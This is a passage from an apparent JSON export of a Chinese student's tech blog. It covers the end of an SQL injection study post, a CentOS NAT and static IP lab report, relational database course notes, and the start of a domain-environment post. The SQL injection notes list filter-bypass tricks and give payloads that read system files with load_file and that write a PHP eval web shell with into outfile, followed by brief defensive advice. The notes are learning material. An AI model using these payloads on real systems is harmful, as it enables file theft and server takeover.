title=\"判断注入点存在\"></a>判断注入点存在</h3><ol>\n<li>插入单引号</li>\n<li>数字型判断</li>\n<li>通过数字的加减判断</li>\n</ol>\n<h2 id=\"绕过\"><a href=\"#绕过\" class=\"headerlink\" title=\"绕过\"></a>绕过</h2><h3 id=\"过滤关键字\"><a href=\"#过滤关键字\" class=\"headerlink\" title=\"过滤关键字\"></a>过滤关键字</h3><ol>\n<li><p>大小写</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221008001157452.png\" alt=\"image-20221008001157452\"></p>\n</li>\n<li><p>双写（替换为空时使用）</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221008001212446.png\" alt=\"image-20221008001212446\"></p>\n</li>\n<li><p>16进制绕过</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221008001254934.png\" alt=\"image-20221008001254934\"></p>\n</li>\n<li><p>url编码绕过（必要时可以通过双重url编码饶过）</p>\n</li>\n</ol>\n<h3 id=\"过滤空格\"><a href=\"#过滤空格\" class=\"headerlink\" title=\"过滤空格\"></a>过滤空格</h3><ol>\n<li>通过注释符绕过<ul>\n<li><h1 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h1></li>\n</ul>\n<hr>\n<ul>\n<li>&#x2F;&#x2F;</li>\n<li>&#x2F;**&#x2F;</li>\n<li>;%00</li>\n</ul>\n</li>\n<li>url编码（双重）</li>\n<li>换行绕过</li>\n<li>特殊符号（引号）</li>\n</ol>\n<h3 id=\"过滤单引号\"><a href=\"#过滤单引号\" class=\"headerlink\" title=\"过滤单引号\"></a>过滤单引号</h3><p>这里是指魔术引号，可以通过宽字节绕过</p>\n<h2 id=\"sql读写文件\"><a href=\"#sql读写文件\" class=\"headerlink\" title=\"sql读写文件\"></a>sql读写文件</h2><p>在mysql用户拥有file权限的时候可以使用load_file和into outfile&#x2F;dumpfile进行读写</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">eg：有sql语句\nselect username from user id&#x3D;$id\n我们可以构建度文件\n?id&#x3D;-1 union select load_file(&#39;&#x2F;ect&#x2F;hosts&#39;)\n如果有单引号过滤，还可以对文件名十六进制\n?id&#x3D;-1 union select load_file(0x2f6563742f686f737473)\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>也可以写文件</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">?id<span class=\"token operator\">=</span><span class=\"token operator\">-</span><span class=\"token number\">1</span> <span class=\"token keyword\">union</span> <span class=\"token keyword\">select</span> <span class=\"token string\">'&lt;?php eval($_post[1]);?>'</span> <span class=\"token keyword\">into</span> <span class=\"token keyword\">outfile</span> <span class=\"token string\">'/var/www/html/shell.php'</span>\n或者\n?id<span class=\"token operator\">=</span><span class=\"token operator\">-</span><span class=\"token number\">1</span> <span class=\"token keyword\">union</span> <span class=\"token keyword\">select</span> unhex<span class=\"token punctuation\">(</span>一句话的<span class=\"token number\">16</span>进制<span class=\"token punctuation\">)</span> <span class=\"token keyword\">into</span> <span class=\"token keyword\">outfile</span> <span class=\"token string\">'/var/www/html/shell.php'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<h2 id=\"sql注入的防御\"><a href=\"#sql注入的防御\" class=\"headerlink\" title=\"sql注入的防御\"></a>sql注入的防御</h2><p>对于一个信安的学生来讲，学习这些我们最终的目的是为了防止sql漏洞被利用，那么就不得不提到怎么去防御sql注入</p>\n<p>首先我们要明确这样一个概念，数据库只做了执行sql语句的作用，对于数据库本身来说没有什么办法来防止sql注入，那么我们应该从操纵数据库的语言着手</p>\n<p>防御方法主要分为两种</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">数据类型判断和特殊字符的转义<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"严格的数据类型\"><a href=\"#严格的数据类型\" class=\"headerlink\" title=\"严格的数据类型\"></a>严格的数据类型</h3><p>如java和C#这种强类型的语言几乎不用考虑数字型注入，如果对传入的参数进行一次数据类型的转化，当传入一个字符串时就会返回Exception而不会执行sql语句</p>\n<p>如果再php或者ASP这种没有强制要求处理数据类型的语言，当传入一个参数时会自动根据参数推导出数据类型，假设id&#x3D;1，则推导出数据类型为Integer、id&#x3D;str，则推导出ID的数据类型为string</p>\n<p>防御数字型的注入相对来说要简单，只要在程序中进行数据类型的判断即可</p>\n<h3 id=\"特殊字符转义\"><a href=\"#特殊字符转义\" class=\"headerlink\" title=\"特殊字符转义\"></a>特殊字符转义</h3><p>通过加强数据类型验证可以解决数字型的SQL注入，但是字符型的SQL注入却不行因为字符型就是string类型的，所以就无法判断输入是否是恶意攻击，那么最好的办法就是对特殊字符进行转义，在查询任意字符都需要单引号，我们可以通过闭合单引号来防御sql注入</p>\n",
            "tags": [
                "Web",
                "SQL注入"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2022/10/24/nat%E6%A8%A1%E5%BC%8Fip%E5%88%86%E9%85%8D/",
            "url": "https://blog.xcu.icu/2022/10/24/nat%E6%A8%A1%E5%BC%8Fip%E5%88%86%E9%85%8D/",
            "title": "nat模式+ip分配",
            "date_published": "2022-10-23T16:00:00.000Z",
            "content_html": "<h2 id=\"实验1：CentOS-8安装、网络配置、远程访问\"><a href=\"#实验1：CentOS-8安装、网络配置、远程访问\" class=\"headerlink\" title=\"实验1：CentOS 8安装、网络配置、远程访问\"></a>实验1：CentOS 8安装、网络配置、远程访问</h2><p><strong>实验目的</strong></p>\n<blockquote>\n<p>1、掌握Linux虚拟机的安装方法；</p>\n<p>2、掌握Linux网络配置方法；</p>\n<p>3、掌握远程访问Linux系统的方式。</p>\n</blockquote>\n<h3 id=\"1-实验要求\"><a href=\"#1-实验要求\" class=\"headerlink\" title=\"1.实验要求\"></a>1.实验要求</h3><blockquote>\n<p>任务1：安装虚拟机；（实验过程可以省略）<br>任务2：安装CentOS 8（建议：最小化安装）； （安装成功后的截图即可）</p>\n<p>任务3：配置网络为NAT模式，实现物理机与虚拟机的相互访问。（要求：IP地址段为学号后两位，即192.168.学号.**）<br>（1）\t虚拟机配置为动态IP地址，Ping物理主机测试连通性。</p>\n<p>（2）\t虚拟机配置为静态IP地址，Ping物理主机测试连通性。</p>\n<p>任务4：Windows主机上安装Xhell，实现远程访问CentOS 8系统。</p>\n<p>任务5：两台Linux相互登陆（可以克隆出另一台CentOS8，也可以使用其他的Linux)。参考《跟阿铭学Linux  第3版.pdf》P45，3.3节 两台Linux相互登陆。  </p>\n<p>任务6：完成后，虚拟机“拍快照”保存当前状态。（实验过程可以省略）</p>\n</blockquote>\n<h3 id=\"2-实验过程\"><a href=\"#2-实验过程\" class=\"headerlink\" title=\"2.实验过程\"></a>2.实验过程</h3><h4 id=\"2-1-安装CentOS-8\"><a href=\"#2-1-安装CentOS-8\" class=\"headerlink\" title=\"2.1 安装CentOS 8\"></a>2.1 安装CentOS 8</h4><p><span class=\"exturl\" data-url=\"aHR0cDovL2lzb3JlZGlyZWN0LmNlbnRvcy5vcmcvY2VudG9zLzcvaXNvcy94ODZfNjQv\">CentOS Mirrors List</span></p>\n<p>用上面的链接下载镜像，并安装</p>\n<img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220914230823866.png\" alt=\"image-20220914230823866\" style=\"zoom: 50%;\" />\n\n<h4 id=\"2-2-配置网络为NAT模式\"><a href=\"#2-2-配置网络为NAT模式\" class=\"headerlink\" title=\"2.2 配置网络为NAT模式\"></a>2.2 配置网络为NAT模式</h4><h5 id=\"（1）虚拟机配置为动态IP地址\"><a href=\"#（1）虚拟机配置为动态IP地址\" class=\"headerlink\" title=\"（1）虚拟机配置为动态IP地址\"></a>（1）虚拟机配置为动态IP地址</h5><ol>\n<li><p>点击vm编辑，点击虚拟网络编辑器</p>\n<img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220914232719340.png\" alt=\"image-20220914232719340\" style=\"zoom:80%;\" />\n</li>\n<li><p>发现需要管理员特权才能更改，点击更改设置</p>\n<img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220914232848187.png\" alt=\"image-20220914232848187\" style=\"zoom: 50%;\" />\n</li>\n<li><p>进入后，选择VMnet8，选择NAT模式，开启DHCP，将子网ip网段改成我的学号后两位09，最后点击确定</p>\n<img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220914233409551.png\" alt=\"image-20220914233409551\" style=\"zoom:50%;\" />\n</li>\n<li><p>等待加载完成后，查看虚拟网卡的IP</p>\n<img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220914233920925.png\" alt=\"image-20220914233920925\" style=\"zoom:50%;\" />\n</li>\n<li><p>查看虚拟机ip，这里发现ip地址的网段没有更改，重启后也没有改变</p>\n<img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220914234018130.png\" alt=\"image-20220914234018130\" style=\"zoom:80%;\" />\n</li>\n<li><p>这里发现物理主机的网段也是0，判断应该是这台Linux虚拟机的网络链接模式还是桥接没有改成NAT</p>\n<img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220914234155024.png\" alt=\"image-20220914234155024\" style=\"zoom:80%;\" />\n</li>\n<li><p>查看本Linux设置中的网络适配器，发现是桥接模式，这里更改为NAT</p>\n<img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220914234423757.png\" alt=\"image-20220914234423757\" style=\"zoom:67%;\" />\n</li>\n<li><p>更改完成重新启动虚拟机，查看ip地址，网段变更一致</p>\n<img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220914234525112.png\" alt=\"image-20220914234525112\" style=\"zoom: 80%;\" />\n</li>\n<li><p>测试Linux和主机的连通性</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220914234633267.png\" alt=\"image-20220914234633267\"></p>\n</li>\n</ol>\n<h5 id=\"（2）虚拟机配置为静态IP地址\"><a href=\"#（2）虚拟机配置为静态IP地址\" class=\"headerlink\" title=\"（2）虚拟机配置为静态IP地址\"></a>（2）虚拟机配置为静态IP地址</h5><ol>\n<li><p>进入&#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;目录打开网卡配置文件ifcfg-ens33</p>\n<img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220914235502407.png\" alt=\"image-20220914235502407\" style=\"zoom:67%;\" />\n</li>\n<li><p>打开后输入i进入插入模式，更改网卡配置文件</p>\n<img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220915000312758.png\" alt=\"image-20220915000312758\" style=\"zoom:80%;\" />\n\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">BOOTPROTO&#x3D;&quot;static&quot;       &#x2F;&#x2F;修改：将dhcp修改为static，修改后为BOOTPROTO&#x3D;static\nONBOOT&#x3D;yes               &#x2F;&#x2F;修改为yes, 网卡开机自启动\n\nIPADDR&#x3D;&quot;xxx.xxx.xxx.xxx&quot;    &#x2F;&#x2F;新增：配置静态IP地址，按需配置\nNETMASK&#x3D;&quot;255.xxx.xxx.xxx&quot;   &#x2F;&#x2F;新增：配置子网掩码\nGATEWAY&#x3D;&quot;xxx.xxx.xxx.xxx&quot;   &#x2F;&#x2F;新增：配置网关\nDNS1&#x3D;&quot;xxx.xxx.xxx.xxx&quot;        &#x2F;&#x2F;新增：配置DNS<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n</li>\n<li><p>点击Esc，键入:wq保存并退出，重启网卡</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220915000632584.png\" alt=\"image-20220915000632584\"></p>\n</li>\n<li><p>再次查看虚拟机的IP地址，发现更改成功</p>\n<img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220915000709576.png\" alt=\"image-20220915000709576\" style=\"zoom:67%;\" />\n</li>\n<li><p>测试Linux和主机的连通性</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220915000755532.png\" alt=\"image-20220915000755532\"></p>\n</li>\n</ol>\n<h4 id=\"2-3-远程访问CentOS-7系统\"><a href=\"#2-3-远程访问CentOS-7系统\" class=\"headerlink\" title=\"2.3 远程访问CentOS 7系统\"></a>2.3 远程访问CentOS 7系统</h4><ol>\n<li><p>点击session</p>\n<img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220915001104778.png\" alt=\"image-20220915001104778\" style=\"zoom:50%;\" />\n</li>\n<li><p>选择ssh，输入IP地址，主机名</p>\n<img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220915001153395.png\" alt=\"image-20220915001153395\" style=\"zoom:50%;\" />\n</li>\n<li><p>点击ok后，键入密码</p>\n<img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220915001334725.png\" alt=\"image-20220915001334725\" style=\"zoom:67%;\" /></li>\n</ol>\n<h4 id=\"2-4-两台Linux密钥登陆\"><a href=\"#2-4-两台Linux密钥登陆\" class=\"headerlink\" title=\"2.4 两台Linux密钥登陆\"></a>2.4 两台Linux密钥登陆</h4><ol>\n<li><p>关闭虚拟机，创建一个克隆</p>\n<img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220915002011897.png\" alt=\"image-20220915002011897\" style=\"zoom: 67%;\" />\n</li>\n<li><p>打开两台虚拟机，查看克隆机的ip地址</p>\n<img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220915002128485.png\" alt=\"image-20220915002128485\" style=\"zoom: 67%;\" />\n</li>\n<li><p>这里更改网卡配置，使得两个虚拟机的IP地址不同</p>\n<img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220915002554200.png\" alt=\"image-20220915002554200\" style=\"zoom:80%;\" />\n</li>\n<li><p>同样使用MobaXterm连接</p>\n<img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220915002848094.png\" alt=\"image-20220915002848094\" style=\"zoom:67%;\" />\n</li>\n<li><p>使用ssh-keygen命令生成密钥对儿</p>\n<img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220915013816602.png\" alt=\"image-20220915013816602\" style=\"zoom:67%;\" />\n</li>\n<li><p>将公钥&#x2F;root&#x2F;.ssh&#x2F;id_rsa.pub的内容存入另一台虚拟机的&#x2F;root&#x2F;.ssh&#x2F;authorized_keys</p>\n<img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220915014118481.png\" alt=\"image-20220915014118481\" style=\"zoom: 67%;\" />\n</li>\n<li><p>便可以直接登录，相互登录实现</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220915015619902.png\" alt=\"image-20220915015619902\"></p>\n</li>\n</ol>\n<h4 id=\"2-5-使用快照保存当前状态\"><a href=\"#2-5-使用快照保存当前状态\" class=\"headerlink\" title=\"2.5 使用快照保存当前状态\"></a>2.5 使用快照保存当前状态</h4><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220915001507112.png\" alt=\"image-20220915001507112\"></p>\n<h3 id=\"3-实验小结\"><a href=\"#3-实验小结\" class=\"headerlink\" title=\"3.实验小结\"></a>3.实验小结</h3><p>经过本次实验，学会了nat模式下的动态ip和静态ip地址的配置，加深了我对桥接和nat两种模式的理解，区分了虚拟网卡和物理网卡的联系和区别，学到了两台Linux主机的免密登录方式</p>\n",
            "tags": [
                "网络服务应用",
                "nat ip分配"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2022/10/24/%E5%85%B3%E7%B3%BB%E6%95%B0%E6%8D%AE%E5%BA%93/",
            "url": "https://blog.xcu.icu/2022/10/24/%E5%85%B3%E7%B3%BB%E6%95%B0%E6%8D%AE%E5%BA%93/",
            "title": "关系数据库",
            "date_published": "2022-10-23T16:00:00.000Z",
            "content_html": "<p>[TOC]</p>\n<h2 id=\"2-1关系数据库结构及形式化定义\"><a href=\"#2-1关系数据库结构及形式化定义\" class=\"headerlink\" title=\"2.1关系数据库结构及形式化定义\"></a>2.1关系数据库结构及形式化定义</h2><h3 id=\"2-1-1关系\"><a href=\"#2-1-1关系\" class=\"headerlink\" title=\"2.1.1关系\"></a>2.1.1关系</h3><p>单一的数据结构–关系</p>\n<ul>\n<li>现实世界的实体以及实体之间的关系均用关系来表示</li>\n</ul>\n<p>逻辑结构—二维表</p>\n<ul>\n<li>从用户角度，关系模型中数据的逻辑结构是一张二维表</li>\n</ul>\n<h4 id=\"域\"><a href=\"#域\" class=\"headerlink\" title=\"域\"></a>域</h4><p>域是一组具有相同数据类型的值的集合</p>\n<ul>\n<li>整数、实数、自然数</li>\n<li>某一个范围的数</li>\n<li>指定长度的字符串集合</li>\n<li>{’男‘，‘女’}</li>\n</ul>\n<h4 id=\"笛卡尔积\"><a href=\"#笛卡尔积\" class=\"headerlink\" title=\"笛卡尔积\"></a>笛卡尔积</h4><ul>\n<li><p>笛卡尔积</p>\n<p>给定一组域D1，D2，…，Dn，这些域中可以有相同的。    D1，D2，…，Dn的笛卡尔积为：    D1×D2×…×Dn ＝ ｛（d1，d2，…，dn）｜diDi，i＝1，2，…，n</p>\n<ol>\n<li>所有域的所有取值的一个组合</li>\n<li>不能重复</li>\n</ol>\n</li>\n<li><p>元组</p>\n<p>笛卡尔积中每一个元素（d1，d2，…，dn）叫作一个n元组（n-tuple）或简称元组(Tuple)</p>\n</li>\n<li><p>分量</p>\n<p>笛卡尔积元素（d1，d2，…，dn）中的每一个值di叫作一个分量</p>\n</li>\n<li><p>基数</p>\n<p>若Di（i＝1，2，…，n）为有限集，其基数(域中所包含的值的个数)为mi（i＝1，2，…，n），则D1×D2×…×Dn的基数M为：</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220918183227871.png\" alt=\"image-20220918183227871\"></p>\n</li>\n<li><p>笛卡尔积的表示方法</p>\n<ul>\n<li>笛卡尔积可以表示为一个二维表</li>\n<li>表中的每行对应一个元组，表中的每列对应一个域</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"关系\"><a href=\"#关系\" class=\"headerlink\" title=\"关系\"></a>关系</h4><ol>\n<li><p>关系<br>D1×D2×…×Dn的子集叫作在域D1，D2，…，Dn上的关系，表示为 ：<br>R（D1，D2，…，Dn）</p>\n<ul>\n<li><p>关系名</p>\n</li>\n<li><p>关系的目或者度</p>\n</li>\n</ul>\n</li>\n<li><p>单元关系于二元关系</p>\n<ul>\n<li>当n&#x3D;1时，称该关系为单元关系或者一元关系</li>\n</ul>\n</li>\n<li><p>关系的表示</p>\n<p>关系也是一个二维表，表的每行对应一个元组，表的每列对应一个域</p>\n</li>\n<li><p>属性</p>\n<ul>\n<li>关系中不同列可以对应相同的域</li>\n<li>为了加以区分，必须对每列起一个名字，称为属性（Attribute）名</li>\n<li>n目关系必有n个属性</li>\n</ul>\n</li>\n<li><p>码</p>\n<ul>\n<li>候选码（Candidate key）：若关系中的某一属性组的值能唯一地标识一个元组，则称该属性组为候选码</li>\n<li>全码（All-key）：关系模式的所有属性是这个关系模式的候选码，称为全码</li>\n<li>主码（Primary key）：若一个关系有多个候选码，则选定其中一个为主码</li>\n<li>外部码：不是当前关系的码，但是其它关系的主码</li>\n<li>主属性：包含在任何候选码中的属性称为主属性。</li>\n<li>非主属性：不包含在任何侯选码中的属性称为非主属性（ Non-Prime attribute）或非码属性（Non-key attribute）</li>\n</ul>\n</li>\n<li><p>三类关系</p>\n<ul>\n<li><p>基本关系（基本表或者基表）</p>\n<p>实际存在的表，是实际存储数据的逻辑表示</p>\n</li>\n<li><p>查询表</p>\n<p>查询结果对应的表</p>\n</li>\n<li><p>视图表</p>\n<p>由基本表或者其他识图表导出的表，是虚表，不对应实际的数据</p>\n</li>\n</ul>\n</li>\n<li><p>基本关系的性质</p>\n<ul>\n<li>列是同质的</li>\n<li>不同的列可以出自一个域<br>其中每个列称为一个属性<br>不同的属性要给与不同的属性名</li>\n<li>列的顺序无所谓，列的次序可以任意交换</li>\n<li>任意两个元组的候选码不能相同</li>\n<li>行的顺序无所谓，行的次序可以任意交换</li>\n<li>分量必须取原子值（最基本的）</li>\n</ul>\n</li>\n</ol>\n<h3 id=\"2-2-2、关系模式\"><a href=\"#2-2-2、关系模式\" class=\"headerlink\" title=\"2.2.2、关系模式\"></a>2.2.2、关系模式</h3><h4 id=\"什么是关系模型\"><a href=\"#什么是关系模型\" class=\"headerlink\" title=\"什么是关系模型\"></a>什么是关系模型</h4><p>关系模式（型）</p>\n<ul>\n<li>对关系的描述</li>\n<li>静态的稳定的</li>\n</ul>\n<p>关系（值）</p>\n<ul>\n<li>关系模式在某一个时刻的状态或者内容</li>\n<li>动态的，随时间变化的</li>\n</ul>\n<p>关系是元组的集合，因此关系模式必须指出这个元组集合的结构，即它由哪些组成，这些属性来自哪些域，以及属性与域之间的映像关系。</p>\n<h4 id=\"定义关系模型\"><a href=\"#定义关系模型\" class=\"headerlink\" title=\"定义关系模型\"></a>定义关系模型</h4><p>关系模式可以形式化的表示为：</p>\n<p>​\tR（U，D，DOM，F）</p>\n<ul>\n<li><p>R       关系名 \t</p>\n</li>\n<li><p>U       组成该关系的属性名集合 \t</p>\n</li>\n<li><p>D       属性组U中属性所来自的域 \t</p>\n</li>\n<li><p>DOM  属性向域的映象集合 \t</p>\n</li>\n<li><p>F        属性间的数据依赖关系集合</p>\n</li>\n</ul>\n<p>关系定义模式通常可以简记为</p>\n<p>R(U)</p>\n<p>关系模式何关系往往统称为关系</p>\n<h4 id=\"关系模型的存储结构\"><a href=\"#关系模型的存储结构\" class=\"headerlink\" title=\"关系模型的存储结构\"></a>关系模型的存储结构</h4><ul>\n<li>关系模型的逻辑结构-表</li>\n<li>关系模型的物理结构<ol>\n<li>有的关系数据库管理中一个表对应一个操作系统文件，将物理数据组织交给操作系统完成；</li>\n<li>有的关系数据库系统从操作系统那里申请若干个大的文件，自己划分文件空间，组织表，索引等存储结构，并进行存储管理。</li>\n</ol>\n</li>\n</ul>\n<h3 id=\"2-2-3关系数据库\"><a href=\"#2-2-3关系数据库\" class=\"headerlink\" title=\"2.2.3关系数据库\"></a>2.2.3关系数据库</h3><p>在一个给定的应用领域中，所有关系的集合构成一个关系数据库 </p>\n<p>关系数据库也有型和值之分</p>\n<h2 id=\"2-2关系操作\"><a href=\"#2-2关系操作\" class=\"headerlink\" title=\"2.2关系操作\"></a>2.2关系操作</h2><h3 id=\"2-2-1、基本关系操作\"><a href=\"#2-2-1、基本关系操作\" class=\"headerlink\" title=\"2.2.1、基本关系操作\"></a>2.2.1、基本关系操作</h3><ol>\n<li>常用的关系操作<ul>\n<li>查询：选择、投影、连接、除、并、交、差、笛卡尔积</li>\n<li>数据更新：插入、删除、修改</li>\n<li>选择、投影、并、差、笛卡尔积是5种基本操作</li>\n</ul>\n</li>\n<li>关系操作的特点<ul>\n<li>集合操作方式：操作的对象和结果都是集合，一次一集合的方式</li>\n</ul>\n</li>\n</ol>\n<h3 id=\"2-2-2、关系数据库语言的分类\"><a href=\"#2-2-2、关系数据库语言的分类\" class=\"headerlink\" title=\"2.2.2、关系数据库语言的分类\"></a>2.2.2、关系数据库语言的分类</h3><ol>\n<li><p>关系代数语言</p>\n<ul>\n<li>用对关系的运算来表达查询要求</li>\n<li>代表ISBL</li>\n</ul>\n</li>\n<li><p>关系演算语言：用谓词来表达查询要求</p>\n<ul>\n<li><p>元组关系演算语言<br>谓词变元的基本对象是元组变量</p>\n<p>代表：APLHA, QUEL</p>\n</li>\n<li><p>域关系演算语言</p>\n<p>谓词变元的基本对象是域变量</p>\n<p>代表：QBE</p>\n</li>\n</ul>\n</li>\n<li><p>介于关系代数何关系演算之间的语言</p>\n<ul>\n<li>代表SQL</li>\n</ul>\n</li>\n</ol>\n<p>每一个ISBL语句都近似于关系代数表达式<br>关系代数、关系演算语言均是抽象的查询语言，这些抽象的语言与具体的关系数据库管理系统中实现的实际语言并不完全一样。但它们能用作评估实际系统中查询语言能力的标准或基础。</p>\n<h2 id=\"2-3关系的完整性\"><a href=\"#2-3关系的完整性\" class=\"headerlink\" title=\"2.3关系的完整性\"></a>2.3关系的完整性</h2><h3 id=\"2-3-1-关系的三类完整性约束\"><a href=\"#2-3-1-关系的三类完整性约束\" class=\"headerlink\" title=\"2.3.1 关系的三类完整性约束\"></a>2.3.1 关系的三类完整性约束</h3><ol>\n<li>实体完整性何参照完整性<br>关系模型必须满足的完整性约束条件，称为关系的两个不变性，应该由关系系统自动支持</li>\n<li>用户定义完整性<br>应用领域需要遵循的约束条件，体现了具体领域中的语义约束</li>\n</ol>\n<h3 id=\"2-3-2-实体完整性\"><a href=\"#2-3-2-实体完整性\" class=\"headerlink\" title=\"2.3.2 实体完整性\"></a>2.3.2 实体完整性</h3><p>(1) 实体完整性规则是针对基本关系而言的。一个基本表通常对应现实世界的一个实体集。 </p>\n<p>(2) 现实世界中的实体是可区分的，即它们具有某种唯一性标识。 </p>\n<p>(3) 关系模型中以主码作为唯一性标识。 </p>\n<p>(4) 主码中的属性即主属性不能取空值。</p>\n<h3 id=\"2-3-3-参照完整性\"><a href=\"#2-3-3-参照完整性\" class=\"headerlink\" title=\"2.3.3 参照完整性\"></a>2.3.3 参照完整性</h3><ol>\n<li><p>关系间的引用</p>\n<p>在关系模型中实体及实体间的联系都是用关系来描     述的，因此可能存在着关系与关系间的引用。</p>\n</li>\n<li><p>外码<br>外码：设F是基本关系R的一个或一组属性，但不是关系R的码。如果F与基本关系S的主码Ks相对应，则称F是基本关系R的外码。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">基本关系R称为参照关系\n基本关系S称为被参照关系或目标关系<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n</li>\n<li><p>参照完整性规则<br>若属性（或属性组）F是基本关系R的外码，它与基本关系S的主码Ks相对应（基本关系R和S不一定是不同的关系），则对于R中每个元组在F上的值必须为：<br>或者取空值（F的每个属性值均为空值）<br>或者等于S中某个元组的主码值</p>\n</li>\n</ol>\n<h3 id=\"2-3-4-用户定义的完整性\"><a href=\"#2-3-4-用户定义的完整性\" class=\"headerlink\" title=\"2.3.4 用户定义的完整性\"></a>2.3.4 用户定义的完整性</h3><ul>\n<li>针对某一具体关系数据库的约束条件，反映某一具体应用所涉及的数据必须满足的语义要求 </li>\n<li>关系模型应提供定义和检验这类完整性的机制，以便用统一的系统的方法处理它们，而不要由应用程序承担这一功能</li>\n</ul>\n<h2 id=\"2-4关系代数\"><a href=\"#2-4关系代数\" class=\"headerlink\" title=\"2.4关系代数\"></a>2.4关系代数</h2><p>关系代数</p>\n<ul>\n<li>一种抽象的查询语言</li>\n<li>用对关系的运算来表达查询</li>\n</ul>\n<p>关系代数的三个要素</p>\n<ul>\n<li>运算对象：关系</li>\n<li>运算结果：关系</li>\n<li>运算符：4类</li>\n</ul>\n<p>集合运算符（）<img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220923174757666.png\" alt=\"image-20220923174757666\" style=\"zoom: 50%;\" /></p>\n<ul>\n<li>将关系看成元组的集合</li>\n<li>运算是从关系的“水平”方向即行的角度来进行</li>\n</ul>\n<p>专门的关系运算符<img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220923175007786.png\" alt=\"image-20220923175007786\" style=\"zoom:50%;\" /></p>\n<ul>\n<li>不仅涉及行而且涉及列</li>\n</ul>\n<p>关系代数运算的分类</p>\n<ul>\n<li><p>传统的集合运算</p>\n<p>并、差、交、广义笛卡尔积</p>\n</li>\n<li><p>专门的关系运算</p>\n<p>选择、投影、连接、除</p>\n</li>\n</ul>\n",
            "tags": [
                "关系数据库",
                "数据库"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2022/10/24/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E5%9F%BA%E7%A1%80%E5%92%8C%E6%90%AD%E5%BB%BA/",
            "url": "https://blog.xcu.icu/2022/10/24/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E5%9F%BA%E7%A1%80%E5%92%8C%E6%90%AD%E5%BB%BA/",
            "title": "域环境基础和搭建",
            "date_published": "2022-10-23T16:00:00.000Z",
